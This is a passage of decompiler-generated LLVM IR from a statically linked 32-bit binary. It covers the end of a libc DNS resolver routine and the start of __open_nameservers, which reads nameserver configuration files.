dec_label_pc_8064f81:                             ; preds = %dec_label_pc_8064f43
  %v4_8064f81 = add i32 %v3_8064f7b, 1
  store i32 %v4_8064f81, i32* %v2_8064f7b, align 4
  br label %dec_label_pc_8064fa8.backedge

dec_label_pc_8064f87:                             ; preds = %dec_label_pc_8064c10, %dec_label_pc_8064f43, %dec_label_pc_8064f3c, %dec_label_pc_8064c27
  %v1_8064f94 = phi i32 [ %v1_8064f77, %dec_label_pc_8064f43 ], [ %v1_8064f43, %dec_label_pc_8064f3c ], [ %v1_8064c63, %dec_label_pc_8064c27 ], [ %v0_8064f87.pre, %dec_label_pc_8064c10 ]
  %v1_8064f87 = add i32 %v1_8064f94, 40
  %v2_8064f87 = inttoptr i32 %v1_8064f87 to i32*
  %v3_8064f87 = load i32, i32* %v2_8064f87, align 4
  %v1_8064f8b = add i32 %v3_8064f87, 1
  store i32 %v1_8064f8b, i32* %eax.global-to-local, align 4
  %v1_8064f8c = ashr i32 %v1_8064f8b, 31
  store i32 %v1_8064f8c, i32* %edx.global-to-local, align 4
  %v1_8064f8d = add i32 %v1_8064f94, 248
  %v2_8064f8d = inttoptr i32 %v1_8064f8d to i32*
  %v3_8064f8d = load i32, i32* %v2_8064f8d, align 4
  %v5_8064f8d = zext i32 %v1_8064f8b to i64
  %v7_8064f8d = zext i32 %v1_8064f8c to i64
  %v8_8064f8d = mul nuw i64 %v7_8064f8d, 4294967296
  %v9_8064f8d = or i64 %v8_8064f8d, %v5_8064f8d
  %v10_8064f8d = zext i32 %v3_8064f8d to i64
  %v11_8064f8d = sdiv i64 %v9_8064f8d, %v10_8064f8d
  %v12_8064f8d = trunc i64 %v11_8064f8d to i32
  store i32 %v12_8064f8d, i32* %eax.global-to-local, align 4
  %v13_8064f8d = srem i64 %v9_8064f8d, %v10_8064f8d
  %v14_8064f8d = trunc i64 %v13_8064f8d to i32
  store i32 %v14_8064f8d, i32* %edx.global-to-local, align 4
  store i32 %v14_8064f8d, i32* %v2_8064f87, align 4
  %v1_8064f98 = icmp eq i32 %v14_8064f8d, 0
  %v1_8064f9a = icmp eq i1 %v1_8064f98, false
  br i1 %v1_8064f9a, label %dec_label_pc_8064fa0, label %dec_label_pc_8064f9c

dec_label_pc_8064f9c:                             ; preds = %dec_label_pc_8064f87
  %v0_8064f9c = load i32, i32* @esp, align 4
  %v1_8064f9c = add i32 %v0_8064f9c, 28
  %v2_8064f9c = inttoptr i32 %v1_8064f9c to i32*
  %v3_8064f9c = load i32, i32* %v2_8064f9c, align 4
  %v4_8064f9c = add i32 %v3_8064f9c, 1
  store i32 %v4_8064f9c, i32* %v2_8064f9c, align 4
  br label %dec_label_pc_8064fa0

dec_label_pc_8064fa0:                             ; preds = %dec_label_pc_8064f87, %dec_label_pc_8064f9c
  %v0_8064fa0 = load i32, i32* @esp, align 4
  %v1_8064fa0 = add i32 %v0_8064fa0, 36
  %v2_8064fa0 = inttoptr i32 %v1_8064fa0 to i32*
  store i32 -1, i32* %v2_8064fa0, align 4
  br label %dec_label_pc_8064fa8.backedge

dec_label_pc_8064fa8.backedge:                    ; preds = %dec_label_pc_8064fa0, %dec_label_pc_8064c1e, %dec_label_pc_8064d0c, %dec_label_pc_8064f81
  %v0_8064fa8.pre = load i32, i32* @esp, align 4
  %v1_8064fa8 = add i32 %v0_8064fa8.pre, 28
  %v2_8064fa8 = inttoptr i32 %v1_8064fa8 to i32*
  %v3_8064fa8 = load i32, i32* %v2_8064fa8, align 4
  %tmp127 = icmp ult i32 %v3_8064fa8, 3
  br i1 %tmp127, label %dec_label_pc_8064a08, label %dec_label_pc_8064fcd

dec_label_pc_8064fcd:                             ; preds = %dec_label_pc_8064982, %dec_label_pc_8064a1e, %dec_label_pc_8064b12, %dec_label_pc_8064fa8.backedge, %entry, %dec_label_pc_806495c, %dec_label_pc_8064964, %dec_label_pc_8064972
  %stack_var_-192.0 = phi i16 [ -1, %dec_label_pc_8064972 ], [ -1, %dec_label_pc_8064964 ], [ -1, %dec_label_pc_806495c ], [ -1, %entry ], [ %v0_80649cf, %dec_label_pc_8064fa8.backedge ], [ %v0_80649cf, %dec_label_pc_8064b12 ], [ %v0_80649cf, %dec_label_pc_8064a1e ], [ %v0_80649cf, %dec_label_pc_8064982 ]
  %v0_8064fcd = call i32 @__GI___h_errno_location()
  store i32 %v0_8064fcd, i32* %eax.global-to-local, align 4
  %v1_8064fd2 = inttoptr i32 %v0_8064fcd to i32*
  store i32 -1, i32* %v1_8064fd2, align 4
  %v0_8064fd8 = load i32, i32* @esp, align 4
  %v1_8064fd8 = add i32 %v0_8064fd8, 44
  %v2_8064fd8 = inttoptr i32 %v1_8064fd8 to i32*
  %v3_8064fd8 = load i32, i32* %v2_8064fd8, align 4
  store i32 %v3_8064fd8, i32* %eax.global-to-local, align 4
  %v2_8064fdc = add i32 %v0_8064fd8, 56
  %v3_8064fdc = inttoptr i32 %v2_8064fdc to i32*
  store i32 %v3_8064fd8, i32* %v3_8064fdc, align 4
  br label %dec_label_pc_8064fe0

dec_label_pc_8064fe0:                             ; preds = %dec_label_pc_8064d45, %dec_label_pc_8064d1d, %dec_label_pc_8064fcd
  %stack_var_-192.1 = phi i16 [ %stack_var_-192.0, %dec_label_pc_8064fcd ], [ %v0_80649cf, %dec_label_pc_8064d45 ], [ %v0_80649cf, %dec_label_pc_8064d1d ]
  %v0_8064fe0 = load i32, i32* @esp, align 4
  %v1_8064fe0 = add i32 %v0_8064fe0, 20
  %v2_8064fe0 = inttoptr i32 %v1_8064fe0 to i32*
  %v3_8064fe0 = load i32, i32* %v2_8064fe0, align 4
  %v13_8064fe0 = icmp eq i32 %v3_8064fe0, -1
  br i1 %v13_8064fe0, label %dec_label_pc_8064fe0.dec_label_pc_8064ff6_crit_edge, label %dec_label_pc_8064fe7

dec_label_pc_8064fe0.dec_label_pc_8064ff6_crit_edge: ; preds = %dec_label_pc_8064fe0
  %.pre = sext i16 %stack_var_-192.1 to i32
  br label %dec_label_pc_8064ff6

dec_label_pc_8064fe7:                             ; preds = %dec_label_pc_8064fe0
  %v3_8064fea = load i32, i32* %v2_8064fe0, align 4
  %v5_8064fea = add i32 %v0_8064fe0, -16
  %v6_8064fea = inttoptr i32 %v5_8064fea to i32*
  store i32 %v3_8064fea, i32* %v6_8064fea, align 4
  %v1_8064fee = sext i16 %stack_var_-192.1 to i32
  %v2_8064fee = call i32 @__libc_close(i32 %v1_8064fee)
  store i32 %v2_8064fee, i32* %eax.global-to-local, align 4
  %v0_8064ff3 = load i32, i32* @esp, align 4
  %v1_8064ff3 = add i32 %v0_8064ff3, 16
  br label %dec_label_pc_8064ff6

dec_label_pc_8064ff6:                             ; preds = %dec_label_pc_8064fe0.dec_label_pc_8064ff6_crit_edge, %dec_label_pc_8064fe7
  %v1_8064ffd.pre-phi = phi i32 [ %.pre, %dec_label_pc_8064fe0.dec_label_pc_8064ff6_crit_edge ], [ %v1_8064fee, %dec_label_pc_8064fe7 ]
  %v0_8064ff6 = phi i32 [ %v0_8064fe0, %dec_label_pc_8064fe0.dec_label_pc_8064ff6_crit_edge ], [ %v1_8064ff3, %dec_label_pc_8064fe7 ]
  %v1_8064ff9 = add i32 %v0_8064ff6, 12
  %v2_8064ff9 = inttoptr i32 %v1_8064ff9 to i32*
  %v3_8064ff9 = load i32, i32* %v2_8064ff9, align 4
  %v5_8064ff9 = add i32 %v0_8064ff6, -16
  %v6_8064ff9 = inttoptr i32 %v5_8064ff9 to i32*
  store i32 %v3_8064ff9, i32* %v6_8064ff9, align 4
  %v2_8064ffd = call i32 @free(i32 %v1_8064ffd.pre-phi)
  store i32 %v2_8064ffd, i32* %eax.global-to-local, align 4
  %v1_8065002 = load i32, i32* @esp, align 4
  %v2_8065002 = inttoptr i32 %v1_8065002 to i32*
  store i32 %v2_806493a, i32* %v2_8065002, align 4
  %v2_8065005 = call i32 @free(i32 %v1_8064ffd.pre-phi)
  store i32 %v2_8065005, i32* %eax.global-to-local, align 4
  %v0_806500a = load i32, i32* @esp, align 4
  %v1_806500d = add i32 %v0_806500a, 32
  %v2_806500d = inttoptr i32 %v1_806500d to i32*
  store i32 -1, i32* %v2_806500d, align 4
  %v0_8065015 = load i32, i32* @esp, align 4
  %v1_8065015 = add i32 %v0_8065015, 40
  %v2_8065015 = inttoptr i32 %v1_8065015 to i32*
  %v3_8065015 = load i32, i32* %v2_8065015, align 4
  %v13_8065015 = icmp eq i32 %v3_8065015, -1
  br i1 %v13_8065015, label %dec_label_pc_8065069, label %dec_label_pc_806501c

dec_label_pc_806501c:                             ; preds = %dec_label_pc_8064ff6
  %v0_806501c = load i32, i32* @ecx, align 4
  %v2_806501c = add i32 %v0_8065015, -4
  %v3_806501c = inttoptr i32 %v2_806501c to i32*
  store i32 %v0_806501c, i32* %v3_806501c, align 4
  %v1_806501d = add i32 %v0_8065015, -8
  %v2_806501d = inttoptr i32 %v1_806501d to i32*
  store i32 ptrtoint (i8** @global_var_807d27c.822 to i32), i32* %v2_806501d, align 4
  %v1_8065022 = add i32 %v0_8065015, -12
  %v2_8065022 = inttoptr i32 %v1_8065022 to i32*
  store i32 134585853, i32* %v2_8065022, align 4
  %v1_8065027 = add i32 %v0_8065015, 184
  store i32 %v1_8065027, i32* @ebx, align 4
  %v2_806502e = add i32 %v0_8065015, -16
  %v3_806502e = inttoptr i32 %v2_806502e to i32*
  store i32 %v1_8065027, i32* %v3_806502e, align 4
  %v4_806502f = inttoptr i32 %v1_8064ffd.pre-phi to i32*
  %v5_806502f = call i32 @__pthread_cleanup_push_defer(i32* %v4_806502f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_806502f, i32* %eax.global-to-local, align 4
  %v0_8065034 = load i32, i32* @esp, align 4
  %v1_8065034 = inttoptr i32 %v0_8065034 to i32*
  store i32 ptrtoint (i8** @global_var_807d27c.822 to i32), i32* %v1_8065034, align 4
  %v2_806503b = call i32 @pthread_mutex_lock(i32 %v1_8064ffd.pre-phi)
  store i32 %v2_806503b, i32* %eax.global-to-local, align 4
  %v0_8065040 = load i32, i32* @esp, align 4
  %v1_8065040 = add i32 %v0_8065040, 56
  %v2_8065040 = inttoptr i32 %v1_8065040 to i32*
  %v3_8065040 = load i32, i32* %v2_8065040, align 4
  store i32 %v3_8065040, i32* %edx.global-to-local, align 4
  %v1_8065044 = add i32 %v0_8065040, 72
  %v2_8065044 = inttoptr i32 %v1_8065044 to i32*
  %v3_8065044 = load i32, i32* %v2_8065044, align 4
  store i32 %v3_8065044, i32* %eax.global-to-local, align 4
  %v1_8065048 = sext i32 %v3_8065040 to i64
  store i64 %v1_8065048, i64* @global_var_807d294.823, align 8
  %v1_806504e = trunc i32 %v3_8065044 to i16
  store i16 %v1_806504e, i16* @global_var_807489c.824, align 4
  %v1_8065054 = inttoptr i32 %v0_8065040 to i32*
  %v2_8065054 = load i32, i32* %v1_8065054, align 4
  store i32 %v2_8065054, i32* %eax.global-to-local, align 4
  %v3_8065054 = add i32 %v0_8065040, 4
  %v1_8065055 = inttoptr i32 %v3_8065054 to i32*
  %v2_8065055 = load i32, i32* %v1_8065055, align 4
  store i32 %v2_8065055, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8065055, align 4
  %v0_8065058 = load i32, i32* @ebx, align 4
  store i32 %v0_8065058, i32* %v1_8065054, align 4
  %v4_8065059 = call i32 @__pthread_cleanup_pop_restore(i32* %v4_806502f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8065059, i32* %eax.global-to-local, align 4
  %v0_806505e = load i32, i32* @esp, align 4
  %v1_806505e = add i32 %v0_806505e, 32
  %v2_806505e = inttoptr i32 %v1_806505e to i32*
  store i32 -1, i32* %v2_806505e, align 4
  br label %dec_label_pc_8065066

dec_label_pc_8065066:                             ; preds = %dec_label_pc_8064eda, %dec_label_pc_806501c
  %v0_8065066 = load i32, i32* @esp, align 4
  %v1_8065066 = add i32 %v0_8065066, 16
  br label %dec_label_pc_8065069

dec_label_pc_8065069:                             ; preds = %dec_label_pc_8064ff6, %dec_label_pc_8065066
  %v0_8065069 = phi i32 [ %v0_8065015, %dec_label_pc_8064ff6 ], [ %v1_8065066, %dec_label_pc_8065066 ]
  %v1_8065069 = add i32 %v0_8065069, 16
  %v2_8065069 = inttoptr i32 %v1_8065069 to i32*
  %v3_8065069 = load i32, i32* %v2_8065069, align 4
  store i32 %v3_8065069, i32* %eax.global-to-local, align 4
  %v1_806506d = add i32 %v0_8065069, 220
  %v1_8065073 = inttoptr i32 %v1_806506d to i32*
  %v2_8065073 = load i32, i32* %v1_8065073, align 4
  store i32 %v2_8065073, i32* @ebx, align 4
  %v3_8065073 = add i32 %v0_8065069, 224
  %v1_8065074 = inttoptr i32 %v3_8065073 to i32*
  %v2_8065074 = load i32, i32* %v1_8065074, align 4
  store i32 %v2_8065074, i32* @esi, align 4
  %v3_8065074 = add i32 %v0_8065069, 228
  %v1_8065075 = inttoptr i32 %v3_8065074 to i32*
  %v2_8065075 = load i32, i32* %v1_8065075, align 4
  store i32 %v2_8065075, i32* @edi, align 4
  %v3_8065075 = add i32 %v0_8065069, 232
  %v1_8065076 = inttoptr i32 %v3_8065075 to i32*
  %v2_8065076 = load i32, i32* %v1_8065076, align 4
  store i32 %v2_8065076, i32* @ebp, align 4
  ret i32 %v3_8065069

; uselistorder directives
  uselistorder i32 %v0_8065069, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8065040, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8065015, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8064ff6, { 1, 0 }
  uselistorder i32 %v1_8064ffd.pre-phi, { 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-192.1, { 1, 0 }
  uselistorder i32 %v0_8064fa8.pre, { 1, 0 }
  uselistorder i32 %v5_8064f7b, { 1, 0 }
  uselistorder i32 %v3_8064f7b, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8064f43, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8064f0c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8064eda, { 1, 0 }
  uselistorder i32 %v3_8064eb9, { 1, 0, 2 }
  uselistorder i32 %v0_8064eaa, { 1, 0 }
  uselistorder i32 %v5_8064ea0, { 1, 0 }
  uselistorder i32* %v3_8064ea0, { 1, 0 }
  uselistorder i32 %v0_8064d7685, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_8064ea0, { 2, 1, 0 }
  uselistorder i32 %v5_8064e9a, { 1, 0 }
  uselistorder i32 %v1_8064e99, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8064e95, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8064e59, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_8064e33, { 1, 0 }
  uselistorder i32 %v1_8064e24, { 1, 0 }
  uselistorder i32 %v0_8064de3, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8064d8a, { 1, 2, 0 }
  uselistorder i32 %v0_8064d8a, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_8064d64, { 1, 0 }
  uselistorder i32 %v1_8064d5e, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8064d59, { 1, 2, 0 }
  uselistorder i32 %v5_8064d6462, { 1, 0 }
  uselistorder i32 %v5_8064d06, { 1, 0 }
  uselistorder i32 %v3_8064d06, { 2, 0, 1, 3 }
  uselistorder i32 %v3_8064cbe, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8064ca4, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_8064ca4, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_8064c83, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8064c63, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8064c09, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_8064bee, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_8064bd7, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8064b5f, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8064b4c, { 3, 0, 1, 2 }
  uselistorder i32 %v1_8064b12, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8064af3, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8064ad7, { 1, 0 }
  uselistorder i32 %v3_8064acc, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_8064ac9, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_8064a6e, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_8064a69, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8064a52, { 1, 0 }
  uselistorder i32 %v1_8064a1e, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8064a0f99, { 2, 1, 0 }
  uselistorder i32 %v3_8064a27, { 1, 0, 4, 3, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i16 %v0_80649cf, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32 %v15_80649c8, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 13 }
  uselistorder i32 %v2_806493a, { 1, 2, 11, 4, 3, 8, 7, 5, 0, 9, 6, 10, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 94, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 52, 46, 47, 48, 49, 50, 51, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 81, 77, 78, 79, 80, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 95, 96, 97, 98, 99, 100, 101, 102 }
  uselistorder i32 51, { 2, 1, 0 }
  uselistorder i32 148, { 0, 13, 11, 1, 2, 3, 4, 5, 6, 7, 12, 8, 9, 10 }
  uselistorder i32 160, { 0, 8, 1, 9, 6, 2, 3, 4, 5, 7 }
  uselistorder i32 43, { 0, 6, 1, 2, 3, 4, 5 }
  uselistorder i32 100, { 5, 20, 7, 8, 11, 6, 9, 10, 0, 1, 2, 3, 12, 13, 14, 4, 15, 16, 17, 18, 19 }
  uselistorder i32 68, { 6, 0, 3, 8, 9, 1, 7, 4, 5, 2, 10 }
  uselistorder i8 1, { 57, 1, 45, 58, 64, 2, 63, 59, 46, 61, 62, 47, 60, 48, 3, 4, 5, 6, 7, 8, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 49, 50, 42, 51, 9, 43, 13, 14, 52, 53, 54, 10, 55, 11, 0, 56, 12, 44 }
  uselistorder i32 27, { 2, 3, 1, 0 }
  uselistorder i32 67, { 0, 2, 1 }
  uselistorder i32 112, { 0, 4, 5, 6, 2, 3, 1 }
  uselistorder i32 88, { 0, 9, 10, 11, 12, 16, 3, 4, 5, 6, 7, 8, 2, 15, 1, 13, 14 }
  uselistorder i32 72, { 7, 8, 9, 5, 10, 4, 3, 2, 6, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 0 }
  uselistorder i32 (%pollfd*, i32, i32)* @__libc_poll, { 3, 0, 1, 2 }
  uselistorder i32 10000, { 3, 0, 1, 2 }
  uselistorder i32 232, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 228, { 1, 0, 6, 2, 3, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 1, 0 }
  uselistorder i32 176, { 1, 2, 3, 0, 4 }
  uselistorder i32 (i32)* @inet_addr, { 1, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder i16 10, { 4, 10, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i32 224, { 0, 4, 3, 1, 2 }
  uselistorder i32 220, { 2, 3, 0, 1 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1, 3, 7, 5, 4, 6 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32* inttoptr (i32 -1 to i32*), { 4, 5, 0, 1, 2, 3, 6, 7 }
  uselistorder i32 200, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 9, 0, 1, 2, 3, 4, 5, 10, 11, 6, 7, 8 }
  uselistorder i32 104, { 2, 0, 3, 1 }
  uselistorder i32 116, { 2, 4, 0, 1, 5, 3 }
  uselistorder i32 84, { 11, 0, 12, 1, 13, 14, 3, 8, 9, 4, 5, 6, 7, 10, 2 }
  uselistorder i8* inttoptr (i32 -1 to i8*), { 2, 3, 4, 0, 1 }
  uselistorder i32 -12, { 25, 19, 18, 20, 17, 21, 22, 23, 24, 26, 27, 28, 29, 30, 16, 32, 33, 31, 34, 35, 36, 37, 38, 2, 39, 133, 130, 131, 43, 40, 41, 42, 44, 45, 7, 129, 5, 6, 3, 4, 46, 8, 9, 47, 132, 53, 54, 48, 49, 50, 51, 52, 55, 56, 10, 57, 134, 65, 64, 12, 59, 13, 60, 61, 62, 63, 58, 11, 66, 67, 70, 69, 71, 72, 73, 74, 68, 75, 76, 77, 93, 94, 95, 92, 89, 88, 90, 91, 85, 86, 87, 84, 83, 82, 79, 80, 81, 78, 96, 97, 98, 99, 100, 101, 102, 103, 0, 104, 107, 105, 106, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 14, 118, 15, 120, 119, 122, 121, 124, 123, 126, 125, 1, 127, 128 }
  uselistorder i16* @global_var_807489c.824, { 2, 1, 0 }
  uselistorder i64 0, { 0, 1, 6, 2, 7, 8, 3, 9, 10, 4, 11, 12, 5, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i64* @global_var_807d294.823, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_807d27c.822 to i32), { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 1025, { 5, 6, 7, 1, 2, 0, 3, 4 }
  uselistorder i32 512, { 10, 3, 11, 12, 7, 8, 0, 1, 2, 4, 5, 6, 9 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8065069, { 1, 0 }
  uselistorder label %dec_label_pc_8065066, { 1, 0 }
  uselistorder label %dec_label_pc_8064ff6, { 1, 0 }
  uselistorder label %dec_label_pc_8064fe0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8064fcd, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_8064fa8.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8064fa0, { 1, 0 }
  uselistorder label %dec_label_pc_8064f87, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8064f3c, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8064eda, { 1, 0 }
  uselistorder label %dec_label_pc_8064eaa, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_8064ea0, { 1, 0 }
  uselistorder label %dec_label_pc_8064e95, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8064e92, { 1, 0 }
  uselistorder label %dec_label_pc_8064e0d, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8064d55, { 1, 0 }
  uselistorder label %dec_label_pc_8064bd7, { 1, 0 }
  uselistorder label %dec_label_pc_8064ba0, { 1, 0 }
  uselistorder label %dec_label_pc_8064b12, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8064a1e, { 1, 0 }
  uselistorder label %dec_label_pc_8064a08, { 1, 0 }
}

define i32 @__open_nameservers(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8065078 = load i32, i32* @ebp, align 4
  %v0_8065079 = load i32, i32* @edi, align 4
  %v0_806507a = load i32, i32* @esi, align 4
  %v0_806507b = load i32, i32* @ebx, align 4
  store i32 %v0_806507b, i32* %stack_var_-16, align 4
  store i32 134585853, i32* %stack_var_-216, align 4
  %v3_8065087 = ptrtoint i32* %stack_var_-216 to i32
  %v4_8065094 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134585853, i32 ptrtoint (i32* @global_var_80748a0.725 to i32))
  %v1_80650a0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_80748a0.725 to i32))
  store i32 %v1_80650a0, i32* @eax, align 4
  %v0_80650a8 = load i32, i32* @global_var_807ea60.726, align 32
  %tmp41 = icmp slt i32 %v0_80650a8, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_806529f, label %dec_label_pc_80650b5

dec_label_pc_80650b5:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_806e2f1.815 to i32), i32* %stack_var_-216, align 4
  %v2_80650c1 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_806e2bf.827 to i32), i32 ptrtoint (i32* @global_var_806e2f1.815 to i32))
  store i32 %v2_80650c1, i32* @eax, align 4
  store i32 %v2_80650c1, i32* @ebp, align 4
  %v1_80650cb = icmp eq i32 %v2_80650c1, 0
  %v1_80650cd = icmp eq i1 %v1_80650cb, false
  br i1 %v1_80650cd, label %dec_label_pc_806526a.preheader, label %dec_label_pc_80650d3

dec_label_pc_80650d3:                             ; preds = %dec_label_pc_80650b5
  store i32 ptrtoint (i32* @global_var_806e2f1.815 to i32), i32* %stack_var_-216, align 4
  %v2_80650df = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_806e2d0.828 to i32), i32 ptrtoint (i32* @global_var_806e2f1.815 to i32))
  store i32 %v2_80650df, i32* @ebp, align 4
  %v1_80650e9 = icmp eq i32 %v2_80650df, 0
  %v1_80650eb = icmp eq i1 %v1_80650e9, false
  br i1 %v1_80650eb, label %dec_label_pc_806526a.preheader, label %dec_label_pc_8065294

dec_label_pc_806526a.preheader:                   ; preds = %dec_label_pc_80650b5, %dec_label_pc_80650d3
  %v2_8065271 = ptrtoint i32* %stack_var_-180 to i32
  %v3_80651a5 = add i32 %v3_8065087, 164
  %v3_806518f = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_806526a

dec_label_pc_80650f6:                             ; preds = %dec_label_pc_8065101
  %v1_80650f6 = add i32 %v0_80650f655, 1
  store i32 %v1_80650f6, i32* @ebx, align 4
  %v1_80650f7 = inttoptr i32 %v1_80650f6 to i8*
  %v2_80650f7 = load i8, i8* %v1_80650f7, align 1
  %v3_80650f7 = zext i8 %v2_80650f7 to i32
  %v5_80650f7 = and i32 %v6_80650f758, -256
  %v6_80650f7 = or i32 %v3_80650f7, %v5_80650f7
  store i32 %v6_80650f7, i32* @ecx, align 4
  %v4_80650f9 = icmp eq i8 %v2_80650f7, 0
  br i1 %v4_80650f9, label %dec_label_pc_806526a, label %dec_label_pc_8065101

dec_label_pc_8065101:                             ; preds = %dec_label_pc_8065101.lr.ph, %dec_label_pc_80650f6
  %v6_80650f758 = phi i32 [ %v6_80650f753, %dec_label_pc_8065101.lr.ph ], [ %v6_80650f7, %dec_label_pc_80650f6 ]
  %v2_80650f757 = phi i8 [ %v2_80650f750, %dec_label_pc_8065101.lr.ph ], [ %v2_80650f7, %dec_label_pc_80650f6 ]
  %v1_80650f756 = phi i8* [ %v1_80650f749, %dec_label_pc_8065101.lr.ph ], [ %v1_80650f7, %dec_label_pc_80650f6 ]
  %v0_80650f655 = phi i32 [ %v0_80650f7.pre, %dec_label_pc_8065101.lr.ph ], [ %v1_80650f6, %dec_label_pc_80650f6 ]
  %v2_8065101 = sext i8 %v2_80650f757 to i32
  store i32 %v2_8065101, i32* @edx, align 4
  store i32 %v0_8065104.pre, i32* @eax, align 4
  %v2_8065109 = mul nsw i32 %v2_8065101, 2
  %v3_8065109 = add i32 %v0_8065104.pre, %v2_8065109
  %v4_8065109 = inttoptr i32 %v3_8065109 to i8*
  %v5_8065109 = load i8, i8* %v4_8065109, align 1
  %v6_8065109 = and i8 %v5_8065109, 32
  %v7_8065109 = icmp eq i8 %v6_8065109, 0
  %v1_806510d = icmp eq i1 %v7_8065109, false
  br i1 %v1_806510d, label %dec_label_pc_80650f6, label %dec_label_pc_806510f

dec_label_pc_806510f:                             ; preds = %dec_label_pc_8065101
  %v10_806510f = icmp eq i8 %v2_80650f757, 10
  br i1 %v10_806510f, label %dec_label_pc_806526a, label %dec_label_pc_8065118

dec_label_pc_8065118:                             ; preds = %dec_label_pc_806510f
  %v10_8065120 = icmp eq i8 %v2_80650f757, 35
  %v1_8065123 = icmp eq i1 %v10_8065120, false
  br i1 %v1_8065123, label %dec_label_pc_8065174.preheader, label %dec_label_pc_806526a

dec_label_pc_8065174.preheader:                   ; preds = %dec_label_pc_8065118
  %v2_80651744 = load i8, i8* %v1_80650f756, align 1
  %v3_80651745 = icmp eq i8 %v2_80651744, 0
